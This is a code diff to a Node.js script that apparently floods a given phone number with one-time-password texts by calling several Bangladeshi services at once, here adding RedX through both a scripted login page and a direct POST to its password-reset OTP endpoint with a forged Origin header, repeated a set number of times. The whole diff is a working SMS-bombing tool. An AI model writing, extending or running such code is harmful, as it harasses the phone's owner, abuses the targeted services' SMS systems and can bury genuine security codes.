@@ -48,6 +48,17 @@ const sites = [
       { action: "wait", ms: 2000 },
     ],
   },
+  {
+    name: "RedX",
+    url: "https://redx.com.bd/login/",
+    steps: [
+      { action: "wait", ms: 3000 },
+      { action: "fill", selector: 'input[name="phone"]' },
+      { action: "wait", ms: 500 },
+      { action: "click", selector: 'button:has-text("Log in")' },
+      { action: "wait", ms: 2000 },
+    ],
+  },
 ];
 
 async function sendBDTickets(phone) {
@@ -115,6 +126,35 @@ async function sendMedEasy(phone) {
   });
 }
 
+function sendRedX(phone) {
+  const https = require('https');
+  const formatted = `880${phone.slice(-10)}`;
+  return new Promise((resolve) => {
+    const data = JSON.stringify({ phone: formatted });
+    const req = https.request('https://api.redx.com.bd/v4/auth/request-password-reset-otp', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Origin': 'https://redx.com.bd',
+        'Content-Length': data.length,
+      },
+    }, (res) => {
+      let d = '';
+      res.on('data', c => d += c);
+      res.on('end', () => {
+        if (res.statusCode >= 200 && res.statusCode < 300) {
+          resolve({ name: 'RedX', status: 'DONE' });
+        } else {
+          resolve({ name: 'RedX', status: 'FAILED', error: `HTTP ${res.statusCode}` });
+        }
+      });
+    });
+    req.on('error', (err) => resolve({ name: 'RedX', status: 'FAILED', error: err.message.split('\n')[0] }));
+    req.write(data);
+    req.end();
+  });
+}
+
 const args = process.argv.slice(2);
 const phone = args[0] || process.env.PHONE;
 const count = parseInt(args[1] || process.env.COUNT || "1");
@@ -161,6 +201,7 @@ async function runSite(browser, site, phone) {
       ...sites.map((site) => runSite(browser, site, phone)),
       sendBDTickets(phone),
       sendMedEasy(phone),
+      sendRedX(phone),
     ]);
     for (const r of results) {
       const v = r.value || {};
